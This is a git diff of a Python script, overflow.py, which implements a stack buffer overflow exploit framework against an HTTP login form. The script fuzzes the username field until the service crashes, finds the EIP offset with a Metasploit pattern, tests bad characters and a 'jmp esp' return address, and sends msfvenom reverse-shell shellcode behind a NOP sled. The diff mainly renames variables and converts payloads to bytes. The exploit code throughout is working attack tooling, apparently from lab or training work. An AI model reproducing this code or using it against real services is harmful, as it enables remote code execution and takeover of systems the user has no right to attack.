@@ -14,7 +14,6 @@ Name: overflow.py
 try:
 	import subprocess as sp
 	import socket
-	import logging
 	from re import search
 	from time import sleep
 	from sys import exit
@@ -50,7 +49,7 @@ class InvalidTargetPortError(TypeError):
 		super().__init__(error_msg)
 
 class InvalidMemoryAddressError(ValueError):
-	"""Will be raised if value passed into the `jump_eip`
+	"""Will be raised if value passed into the `jump_esp`
 	does not contain a length of four which will be the four
 	bytes that overwrite the EIP.
 	"""
@@ -63,7 +62,7 @@ class NoOffsetError(AttributeError):
 		super().__init__(error_msg)
 
 class NoEipMemoryAddressError(AttributeError):
-	"""Will be raised if `jump_eip` attribute has not been set"""
+	"""Will be raised if `jump_esp` attribute has not been set"""
 	def __init__(sefl, error_msg):
 		super().__init__(error_msg)
 
@@ -97,8 +96,8 @@ class Overflow:
 
 	def __init__(
 		self, targ_ip, targ_port, bad_chars=[],
-		offset=None, num_bytes_crash=None, jump_eip=None,
-		max_fuzz_bytes=2000, fuzz_interval_seconds=10, fuzz_increment=100
+		offset=None, num_bytes_crash=None, jump_esp=None,
+		max_fuzz_bytes=2000, fuzz_interval_seconds=5, fuzz_increment=100
 	):
 		"""Initialize variables
 
@@ -109,7 +108,7 @@ class Overflow:
 			offset (int): Will store the integer returned by msf"s pattern_offset file
 						that determines where the offset occured in the fuzzing process
 			num_bytes_crash (int): The number of bytes it took to crash the system
-			jump_eip (str): Will store the four bytes necessary to overwrite eip register with jump command
+			jump_esp (str): Will store the four bytes necessary to overwrite eip register with jump command
 			max_fuzz_bytes (int): The maximum number of bytes to fuzz the application with, default = 3000
 			fuzz_interval_seconds (int): The number of seconds to wait in between the fuzzing process, default = 10
 			fuzz_increment (int): The number of bytes to increment each payload during the initial fuzz testing, default = 100
@@ -138,7 +137,7 @@ class Overflow:
 		self._bad_chars = bad_chars
 		self._offset = offset
 		self._num_bytes_crash = num_bytes_crash
-		self._jump_eip = jump_eip
+		self._jump_esp = jump_esp
 		self._max_fuzz_bytes = max_fuzz_bytes
 		self._fuzz_interval_seconds = fuzz_interval_seconds
 		self._fuzz_increment = fuzz_increment
@@ -147,13 +146,13 @@ class Overflow:
 		return (f"Ezfuzz(\n\ttarg_ip = '{self.targ_ip}',\n\ttarg_port = {self.targ_port},"
 				f"\n\tbad_characters = {self.bad_chars},"
 				f"\n\toffset = {self.offset},\n\tnum_bytes_crash = {self.num_bytes_crash},"
-				f"\n\tjump_eip = {self.jump_eip},\n\tmax_fuzz_bytes = {self.max_fuzz_bytes},"
+				f"\n\tjump_esp = {self.jump_esp},\n\tmax_fuzz_bytes = {self.max_fuzz_bytes},"
 				f"\n\tfuzz_interval_seconds = {self.fuzz_interval_seconds},"
 				f"\n\tfuzz_increment = {self.fuzz_increment}\n)")
 
 
 	def __str__(self):
-		return f"Ezfuzz(target_ip_address='{self.targ_ip}', target_port={self.targ_port})\n"
+		return f"Ezfuzz(target_ip_address='{self.targ_ip}', target_port={self.targ_port})"
 
 	@property
 	def targ_ip(self) -> str:
@@ -168,7 +167,7 @@ class Overflow:
 			new_ip (str): The new target IP address
 		
 		Raises:
-			InvalidTargetIPError:
+			InvalidTargetIPError: if `new_ip` is not a valid IP address
 		"""
 		try:
 			if not isinstance(new_ip, str):
@@ -193,7 +192,7 @@ class Overflow:
 			new_port (int): The new target port number
 
 		Raises:
-			InvalidTargetPortError:
+			InvalidTargetPortError: if `new_port` is not of type `int`
 	"""
 		try:
 			if not isinstance(new_port, int):
@@ -284,7 +283,7 @@ class Overflow:
 			offset_value (int): The offset returned by the `get_offset` function
 
 		Raises:
-			TypeError: 
+			TypeError: if `offset_value` is not of type `int`
 		"""
 		try:
 			if not isinstance(offset_value , int):
@@ -295,22 +294,22 @@ class Overflow:
 			self._offset = offset_value
 
 	@property
-	def jump_eip(self):
-		"""Returns the memory address variable,`jump_eip`, 
-		containing the jump eip instruction"""
-		return self._jump_eip
+	def jump_esp(self):
+		"""Returns the memory address variable,`jump_esp`, 
+		containing the 'jump esp' instruction"""
+		return self._jump_esp
 
-	@jump_eip.setter
-	def jump_eip(self, jump_mem_location):
-		"""Sets the memory address variable, `jump_eip`, to
+	@jump_esp.setter
+	def jump_esp(self, jump_mem_location):
+		"""Sets the memory address variable, `jump_esp`, to
 		containing the jump eip instruction
 
 		Args:
-			jump_mem_location (str): The memory address that will be used to jump the EIP obtained
-										to execute our payload.
+			jump_mem_location (str): The memory address that will be used to jump the esp register obtained
+										with mona script to execute our payload.
 
 		Raises:
-			InvalidMemoryAddressError: if memory address is not 16 characters in length
+			InvalidMemoryAddressError: if memory address is not 4 characters in length
 								(Ex. \x8f\x35\x4a\x5f) = 4 bytes)
 		"""
 		try:
@@ -320,7 +319,7 @@ class Overflow:
 			print(rd+bld+"[-]"+rst+f" InvalidMemoryAddressError: {err}")
 			exit(1)
 		else:
-			self._jump_eip = jump_mem_location
+			self._jump_esp = jump_mem_location
 
 	@property
 	def fuzz_interval_seconds(self):
@@ -352,10 +351,11 @@ class Overflow:
 
 	@fuzz_increment.setter
 	def fuzz_increment(self, new_increment):
-		"""Sets the `fuzz_increment` value to 
+		"""Sets the `fuzz_increment` value
 
 		Args:
-			new_increment (int): 
+			new_increment (int): the number of bytes to send for each iteration of the
+								fuzzing process
 
 		Raises:
 			TypeError: if `value` argument is not of type `int`
@@ -391,26 +391,21 @@ class Overflow:
 			chars (str): Will determine if bad characters string will be sent, default=None
 			shellcode (bytes): Will store the contents of the msfvenom generated reverse shell
 									payload, default=None
-
-		Exceptions:
-			KeyboardInterrupt: handles this error when user stops the program when aware of the
-							the number of bytes it took to crash the application
-			BaseException: handles any possible error when attempting to connect to target
-						using sockets
 		"""
 		self.num_bytes_crash = 100
 
 		if not chars and not shellcode:
-			print(pe+bld+"[+]"+rst+" Intiating fuzzing procedure")
+			print(pe+bld+"[+]"+rst+" Fuzzing application...")
 			while self.num_bytes_crash <= self.max_fuzz_bytes:
 				content = (
-					"username=" 
-					+ "A"*self.num_bytes_crash 
-					+ "&password=A"
+					b"username=" 
+					+ b"A"*self.num_bytes_crash 
+					+ b"&password=A"
 				)
 				buff = self._HTTP_header()
 				buff += f"Content-Length: {str(len(content))}\r\n"
 				buff += "\r\n"
+				buff = bytes(buff, "utf-8")
 				buff += content
 
 				soc = self._create_socket()
@@ -418,7 +413,7 @@ class Overflow:
 
 				try:
 					print(be+bld+"[+]"+rst+f" Sending payload containing {gn+str(self.num_bytes_crash)+rst} bytes")
-					soc.send(bytes(buff, "utf-8"))
+					soc.send(buff)
 					soc.recv(1024)
 					self.num_bytes_crash += self.fuzz_increment
 					soc.close()
@@ -437,7 +432,7 @@ class Overflow:
 						+ b"A"*self.offset 
 						+ b"B"*4
 						+ b"C"*4
-						+ chars.encode()
+						+ chars
 						+ b"D"*(self.num_bytes_crash-self.offset-4-4-len(chars))
 						+ b"&password=A"
 					)
@@ -452,7 +447,7 @@ class Overflow:
 
 			soc = self._create_socket()
 
-			print(yw+bld+"[+]"+rst+" Sent bad characters string")
+			print(yw+bld+"[+]"+rst+" Sent bad characters payload...")
 			try:
 				soc.send(buff)
 			except BaseException as err:
@@ -464,13 +459,13 @@ class Overflow:
 			try:
 				if not self.offset:
 					raise NoOffsetError("An offset must be set before sending a reverse shell payload")
-				elif not self.jump_eip:
+				elif not self.jump_esp:
 					raise NoEipMemoryAddressError("A memory address must be set to overwrite eip")
 				else:
 					content  = (
 						b"username="
 						+ b"A"*self.offset
-						+ self.jump_eip
+						+ self.jump_esp
 						+ b"C"*4
 						+ self.nops
 						+ shellcode
@@ -508,7 +503,7 @@ class Overflow:
 				raise Exception("The `num_bytes_crash` variable must be set before creating a pattern")
 			payload = pattern_create(self.num_bytes_crash)
 		except Exception as err:
-			print(rd+bld+"[-]"+rst+" {err}")
+			print(rd+bld+"[-]"+rst+f" {err}")
 			exit(1)
 
 		soc = self._create_socket()
@@ -559,19 +554,22 @@ class Overflow:
 			if to_test == "offset":
 				if not self.offset:
 					raise NoOffsetError("Please run `get_offset` to get and set `offset` value")
+				print(yw+bld+"[!]"+rst+" Testing offset... check eip register for B's")
 				payload = (
-					"A"*self.offset 
-					+ "B"*4 
-					+ "C"*(self.num_bytes_crash-self.offset-4)
+					b"A"*self.offset 
+					+ b"B"*4
+					+ b"C"*4
+					+ b"D"*(self.num_bytes_crash-self.offset-4)
 				)
-			if to_test == "eip":
+			if to_test == "esp":
 				if not self.offset:
 					raise NoOffsetError("Please run `get_offset` to get and set `offset` value")
-				if not self.jump_eip:
-					raise NoEipMemoryAddressError("Please set the `jump_eip` value in order to test jump esp memory address") from None
+				if not self.jump_esp:
+					raise NoEipMemoryAddressError("Please set the `jump_esp` property in order to test `jump esp` memory address") from None
+				print(yw+bld+"[!]"+rst+" Testing esp address... don't forget to set a break point at this memory address")
 				payload = (
 					b"A"*self.offset
-					+ self.jump_eip #self.jump_eip # Works with the following bytes \x9d\x9e\x9f\xa0 but not \x83\x0c\x09\x10??
+					+ self.jump_esp
 					+ b"C"*4
 					+ b"D"*(self.num_bytes_crash-self.offset-4-4)
 				)
@@ -591,7 +589,9 @@ class Overflow:
 			print(rd+bld+"[-]"+rst+f" InvalidArgument: '{to_test}' ->  Argument to function `test` must be `offset` or `eip`")
 			exit(1)
 		else:
+
 			soc = self._create_socket()
+
 			try:
 				with soc:
 					soc.send(buff)
@@ -626,9 +626,6 @@ class Overflow:
 			soc.connect((self.targ_ip, self.targ_port))
 		except socket.error as err:
 			print(rd+bld+"[-]"+rst+f" SocketError: {err}")
-			exit(1)
-		except KeyboardInterrupt:
-			print(rd+bld+"\n[-]"+rst+" Terminating program...")
 			exit(1)
 		else:
 			return soc
